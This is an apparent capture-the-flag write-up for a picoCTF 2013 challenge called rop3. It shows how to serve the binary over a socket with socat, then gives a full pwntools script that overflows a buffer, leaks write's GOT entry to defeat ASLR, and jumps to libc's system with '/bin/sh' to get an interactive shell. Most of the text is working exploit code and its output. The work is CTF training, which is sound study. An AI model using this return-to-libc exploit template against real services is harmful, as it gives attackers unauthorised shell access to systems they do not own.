### S0lv3d by H4yicl3

similar to local !!
But we use socket to connect the sever !!

so we need to use socat make the sever 
```
socat tcp-listen:4447,reuseaddr,fork exec:./rop3
```

so we need to connect it with python script
```python
from pwn import *

host = "127.0.0.1"
port = 4447

s = remote(host,port)

s.close()
```

try run it
```
hayicle@ubuntu:~/ctf/2013pico$ socat tcp-listen:4447,reuseaddr,fork exec:./rop3 &
[1] 4033
hayicle@ubuntu:~/ctf/2013pico$ python rop3_socket.py 
[+] Opening connection to 127.0.0.1 on port 4447: Done
[*] Closed connection to 127.0.0.1 port 4447
```

ok we make the python script look like rop3_local.py
```python
from pwn import *

host = "127.0.0.1"
port = 4447

padding = "A"*140
#write function : write(1,address,4)
#use IDA to find the address 
write_plt = 0x080483A0
write_got = 0x0804A010
vuln_function = 0x08048474

payload = padding + p32(write_plt) + p32(vuln_function) + p32(1) + p32(write_got) +p32(4)
s = remote(host,port)
#raw_input("?")
s.sendline(payload)

address_aslr = u32(s.recv(4))
print hex(address_aslr)

#use libc-database to find the offset
offset_system =	0x00040310 
offset_binsh  =	0x16084c
offset_write  =	0x000dafe0

address_libc_base = address_aslr - offset_write
address_system 	  =	address_libc_base + offset_system
address_binsh	  = address_libc_base + offset_binsh

payload2 = padding + p32(address_system) + p32(vuln_function) + p32(address_binsh)

s.sendline(payload2)

s.interactive()

s.close()
```

if got problem we beed use gdb to debug that
```
sudo gdb
shell pidof socat
attach pid
breakpoint
```
